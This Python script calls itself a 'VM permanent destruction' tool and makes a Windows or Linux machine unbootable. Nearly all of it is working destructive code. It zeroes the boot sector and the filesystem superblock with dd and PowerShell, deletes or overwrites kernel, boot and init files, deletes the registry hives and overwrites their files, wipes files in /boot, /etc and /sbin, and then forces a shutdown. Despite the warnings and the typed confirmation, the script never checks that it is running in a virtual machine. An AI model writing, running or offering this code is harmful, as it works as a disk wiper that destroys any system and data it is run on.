"""
VM PERMANENT DESTRUCTION SCRIPT
================================================================================
WARNING: THIS SCRIPT WILL PERMANENTLY DESTROY YOUR VIRTUAL MACHINE
================================================================================

This script will:
- Corrupt critical boot files
- Delete essential system files
- Corrupt partition tables
- Overwrite critical system data
- Make the VM UNBOOTABLE PERMANENTLY

THIS IS IRREVERSIBLE. THE VM WILL NEVER START AGAIN.

Use ONLY in isolated test environments with no important data.
================================================================================
"""

import os
import sys
import time
import subprocess
import shutil
from pathlib import Path
import platform

class VMPermanentDestroyer:
    """
    Permanently destroys a virtual machine by corrupting critical system files.
    """
    
    def __init__(self, delay_seconds: int = 30):
        """
        Initialize destroyer.
        
        Args:
            delay_seconds: Delay before destruction (safety window)
        """
        self.delay_seconds = delay_seconds
        self.is_windows = platform.system() == 'Windows'
        self.destruction_started = False
        
    def print_warning(self):
        """Print severe warning message."""
        print("\n" + "=" * 80)
        print(" " * 20 + "CRITICAL WARNING")
        print("=" * 80)
        print()
        print("THIS SCRIPT WILL PERMANENTLY DESTROY YOUR VIRTUAL MACHINE")
        print()
        print("Actions that will be performed:")
        print("  - Corrupt boot sector and partition table")
        print("  - Delete critical system files")
        print("  - Corrupt Windows registry (if Windows)")
        print("  - Overwrite critical boot files")
        print("  - Corrupt filesystem metadata")
        print("  - Delete system directories")
        print()
        print("RESULT: VM WILL BE COMPLETELY UNBOOTABLE")
        print("THIS CANNOT BE UNDONE")
        print()
        print("=" * 80)
        print(f"Destruction will begin in {self.delay_seconds} seconds...")
        print("Press Ctrl+C NOW to cancel")
        print("=" * 80)
        print()
        
        for i in range(self.delay_seconds, 0, -1):
            print(f"PERMANENT DESTRUCTION IN {i} SECONDS...", end='\r')
            time.sleep(1)
        print("\n" + "=" * 80)
        print("DESTRUCTION SEQUENCE INITIATED - IRREVERSIBLE")
        print("=" * 80 + "\n")
    
    def destroy_boot_sector(self):
        """Corrupt boot sector and partition table."""
        print("[DESTROY] Corrupting boot sector and partition table...")
        try:
            if self.is_windows:
                # Windows: Corrupt MBR/GPT
                try:
                    # Attempt to write garbage to boot sector
                    # This requires admin privileges
                    boot_device = "\\\\.\\PhysicalDrive0"
                    garbage_data = b'\x00' * 512  # Corrupt first 512 bytes (MBR)
                    
                    # Use PowerShell to corrupt boot sector
                    ps_script = f'''
                    $bytes = New-Object byte[] 512
                    for ($i=0; $i -lt 512; $i++) {{ $bytes[$i] = 0 }}
                    $stream = [System.IO.File]::OpenWrite("{boot_device}")
                    $stream.Write($bytes, 0, 512)
                    $stream.Close()
                    '''
                    
                    subprocess.run(
                        ["powershell", "-Command", ps_script],
                        shell=True,
                        timeout=5,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    print("[DESTROY] Boot sector corruption attempted")
                except Exception as e:
                    print(f"[DESTROY] Boot sector: {e}")
            else:
                # Linux: Corrupt MBR
                try:
                    # Write zeros to first 512 bytes of disk
                    subprocess.run(
                        ["dd", "if=/dev/zero", "of=/dev/sda", "bs=512", "count=1"],
                        timeout=5,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    print("[DESTROY] Boot sector corrupted")
                except Exception as e:
                    print(f"[DESTROY] Boot sector: {e}")
        except Exception as e:
            print(f"[DESTROY] Boot sector error: {e}")
    
    def destroy_system_files(self):
        """Delete critical system files."""
        print("[DESTROY] Deleting critical system files...")
        
        if self.is_windows:
            critical_paths = [
                "C:\\Windows\\System32\\ntoskrnl.exe",
                "C:\\Windows\\System32\\hal.dll",
                "C:\\Windows\\System32\\boot\\winload.exe",
                "C:\\Windows\\System32\\boot\\winload.efi",
                "C:\\Windows\\bootstat.dat",
                "C:\\bootmgr",
                "C:\\Windows\\System32\\config\\SYSTEM",
                "C:\\Windows\\System32\\config\\SOFTWARE",
            ]
        else:
            critical_paths = [
                "/boot/vmlinuz",
                "/boot/initrd.img",
                "/sbin/init",
                "/bin/sh",
                "/bin/bash",
                "/etc/fstab",
            ]
        
        deleted_count = 0
        for path in critical_paths:
            try:
                if os.path.exists(path):
                    # Try to delete
                    try:
                        os.remove(path)
                        print(f"[DESTROY] Deleted: {path}")
                        deleted_count += 1
                    except PermissionError:
                        # Try to corrupt instead
                        try:
                            with open(path, 'wb') as f:
                                f.write(b'\x00' * 1024)  # Corrupt first 1KB
                            print(f"[DESTROY] Corrupted: {path}")
                            deleted_count += 1
                        except:
                            pass
            except Exception as e:
                pass
        
        print(f"[DESTROY] Affected {deleted_count} critical files")
    
    def destroy_registry(self):
        """Corrupt Windows registry."""
        if not self.is_windows:
            return
        
        print("[DESTROY] Corrupting Windows registry...")
        try:
            registry_hives = [
                "HKLM\\SYSTEM",
                "HKLM\\SOFTWARE",
                "HKLM\\SAM",
                "HKLM\\SECURITY",
            ]
            
            for hive in registry_hives:
                try:
                    # Attempt to delete registry keys
                    subprocess.run(
                        ["reg", "delete", hive, "/f"],
                        timeout=3,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                except:
                    pass
            
            # Corrupt registry files directly
            registry_files = [
                "C:\\Windows\\System32\\config\\SYSTEM",
                "C:\\Windows\\System32\\config\\SOFTWARE",
                "C:\\Windows\\System32\\config\\SAM",
                "C:\\Windows\\System32\\config\\SECURITY",
            ]
            
            for reg_file in registry_files:
                try:
                    if os.path.exists(reg_file):
                        with open(reg_file, 'wb') as f:
                            f.write(b'\xFF' * 10240)  # Corrupt 10KB
                        print(f"[DESTROY] Corrupted registry: {reg_file}")
                except:
                    pass
                    
        except Exception as e:
            print(f"[DESTROY] Registry corruption: {e}")
    
    def destroy_system_directories(self):
        """Delete or corrupt system directories."""
        print("[DESTROY] Destroying system directories...")
        
        if self.is_windows:
            target_dirs = [
                "C:\\Windows\\System32\\drivers",
                "C:\\Windows\\Boot",
                "C:\\Windows\\System32\\config",
            ]
        else:
            target_dirs = [
                "/boot",
                "/etc",
                "/sbin",
            ]
        
        for dir_path in target_dirs:
            try:
                if os.path.exists(dir_path):
                    # Try to delete files in directory
                    for root, dirs, files in os.walk(dir_path):
                        for file in files[:10]:  # Limit to first 10 files per dir
                            try:
                                file_path = os.path.join(root, file)
                                os.remove(file_path)
                            except:
                                try:
                                    # Corrupt instead
                                    with open(file_path, 'wb') as f:
                                        f.write(b'\x00' * 512)
                                except:
                                    pass
                    print(f"[DESTROY] Affected directory: {dir_path}")
            except Exception as e:
                pass
    
    def corrupt_filesystem(self):
        """Corrupt filesystem metadata."""
        print("[DESTROY] Corrupting filesystem metadata...")
        try:
            if self.is_windows:
                # Corrupt NTFS metadata
                try:
                    # Use fsutil to corrupt filesystem
                    subprocess.run(
                        ["fsutil", "dirty", "set", "C:"],
                        timeout=3,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                except:
                    pass
            else:
                # Corrupt ext filesystem
                try:
                    # Write to superblock
                    subprocess.run(
                        ["dd", "if=/dev/zero", "of=/dev/sda1", "bs=1024", "count=1", "seek=0"],
                        timeout=3,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                except:
                    pass
            print("[DESTROY] Filesystem corruption attempted")
        except Exception as e:
            print(f"[DESTROY] Filesystem error: {e}")
    
    def overwrite_critical_data(self):
        """Overwrite critical system data areas."""
        print("[DESTROY] Overwriting critical system data...")
        
        if self.is_windows:
            critical_files = [
                "C:\\bootmgr",
                "C:\\Windows\\System32\\winload.exe",
                "C:\\Windows\\System32\\winresume.exe",
            ]
        else:
            critical_files = [
                "/boot/grub/grub.cfg",
                "/etc/init.d/rcS",
            ]
        
        for file_path in critical_files:
            try:
                if os.path.exists(file_path):
                    with open(file_path, 'wb') as f:
                        # Overwrite with garbage
                        f.write(b'\xFF' * 10240)  # 10KB of 0xFF
                    print(f"[DESTROY] Overwritten: {file_path}")
            except Exception as e:
                pass
    
    def destroy_all(self):
        """Execute all destruction methods."""
        self.destruction_started = True
        
        print("\n[DESTROY] Starting permanent destruction sequence...\n")
        
        # Method 1: Boot sector
        self.destroy_boot_sector()
        time.sleep(1)
        
        # Method 2: System files
        self.destroy_system_files()
        time.sleep(1)
        
        # Method 3: Registry (Windows)
        if self.is_windows:
            self.destroy_registry()
            time.sleep(1)
        
        # Method 4: System directories
        self.destroy_system_directories()
        time.sleep(1)
        
        # Method 5: Filesystem
        self.corrupt_filesystem()
        time.sleep(1)
        
        # Method 6: Critical data
        self.overwrite_critical_data()
        
        print("\n" + "=" * 80)
        print("DESTRUCTION COMPLETE")
        print("=" * 80)
        print()
        print("Your virtual machine has been permanently damaged.")
        print("The system will NOT boot on next restart.")
        print("This damage is IRREVERSIBLE.")
        print()
        print("=" * 80)
        print()
        
        # Force immediate shutdown to prevent recovery
        print("[DESTROY] Forcing system shutdown in 5 seconds...")
        time.sleep(5)
        
        try:
            if self.is_windows:
                subprocess.run(["shutdown", "/s", "/t", "0", "/f"], timeout=2)
            else:
                subprocess.run(["shutdown", "-h", "now"], timeout=2)
        except:
            pass


def main():
    """Main entry point."""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='VM PERMANENT DESTRUCTION SCRIPT - IRREVERSIBLE',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
WARNING: This script will PERMANENTLY destroy your VM.

It will:
- Corrupt boot sector
- Delete critical system files
- Corrupt registry/filesystem
- Make VM UNBOOTABLE

THIS CANNOT BE UNDONE.

Example:
  python vm_permanent_destroy.py --delay 30
        """
    )
    
    parser.add_argument(
        '--delay',
        type=int,
        default=30,
        help='Delay before destruction in seconds (default: 30)'
    )
    
    args = parser.parse_args()
    
    # Additional confirmation
    print("\n" + "!" * 80)
    print(" " * 25 + "FINAL WARNING")
    print("!" * 80)
    print("\nThis script will PERMANENTLY DESTROY your virtual machine.")
    print("The VM will NEVER boot again after this script runs.")
    print("\nType 'DESTROY' to continue, or anything else to cancel:")
    confirmation = input("> ")
    
    if confirmation != "DESTROY":
        print("\nDestruction cancelled.")
        sys.exit(0)
    
    # Create and run destroyer
    destroyer = VMPermanentDestroyer(delay_seconds=args.delay)
    destroyer.print_warning()
    destroyer.destroy_all()


if __name__ == '__main__':
    main()
